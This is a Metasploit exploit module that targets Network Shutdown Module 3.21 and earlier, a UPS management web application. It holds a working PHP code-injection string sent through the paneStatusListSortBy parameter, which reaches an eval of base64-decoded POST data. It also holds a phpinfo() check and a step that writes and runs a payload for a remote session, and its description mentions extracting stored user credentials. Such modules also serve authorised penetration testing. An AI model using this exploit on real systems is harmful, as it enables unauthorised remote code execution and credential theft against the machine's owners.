# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/php_exe&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Network Shutdown Module <= 3.21 (sort_values) Remote PHP Code Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in lib/dbtools.inc which uses
        unsanitized user input inside a eval() call. Additionally the base64 encoded
        user credentials are extracted from the database of the application. Please
        note that in order to be able to steal credentials, the vulnerable service
        must have at least one USV module (an entry in the "nodes" table in mgedb.db)
      },
      &#039;Author&#039;         =>
        [
          &#039;h0ng10&#039;,  # original discovery, msf module
          &#039;sinn3r&#039;   # PhpEXE shizzle
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;83199&#039;],
          [&#039;URL&#039;, &#039;http://secunia.com/advisories/49103/&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 4000
        },
      &#039;Platform&#039;       => [&#039;php&#039;, &#039;linux&#039;],
      &#039;Arch&#039;           => ARCH_PHP,

      &#039;Targets&#039;        =>
        [
          [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; }  ],
          [ &#039;Linux x86&#039;            , { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039;} ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Jun 26 2012&#039;
    ))

    register_options(
      [
        Opt::RPORT(4679)
      ], self.class)
  end

  def check
    # we use a call to phpinfo() for verification
    res = execute_php_code("phpinfo();die();")

    if not res or res.code != 200
      print_error("Failed: Error requesting page")
      return CheckCode::Unknown
    end

    return CheckCode::Vulnerable if (res.body =~ /This program makes use of the Zend/)
    return CheckCode::Safe
  end

  def execute_php_code(code, opts = {})
    param_name = rand_text_alpha(6)
    padding    = rand_text_alpha(6)
    url_param  = "#{padding}%22%5d,%20eval(base64_decode(%24_POST%5b%27#{param_name}%27%5d))%29;%2f%2f"

    res = send_request_cgi(
      {
        &#039;uri&#039;   =>  &#039;/view_list.php&#039;,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_get&#039; =>
          {
            &#039;paneStatusListSortBy&#039; => url_param,
          },
        &#039;vars_post&#039; =>
          {
            param_name => Rex::Text.encode_base64(code),
          },
        &#039;headers&#039; =>
          {
            &#039;Connection&#039; => &#039;Close&#039;,
          }
      })
  end

  def no_php_tags(p)
    p = p.gsub(/^<\?php /, &#039;&#039;)
    p.gsub(/ \?\>$/, &#039;&#039;)
  end

  def exploit
    print_status("#{rhost}:#{rport} - Sending payload")

    unlink = (target[&#039;Platform&#039;] == &#039;linux&#039;) ? true : false
    p      = no_php_tags(get_write_exec_payload(:unlink_self => unlink))

    execute_php_code(p)
    handler
  end
end

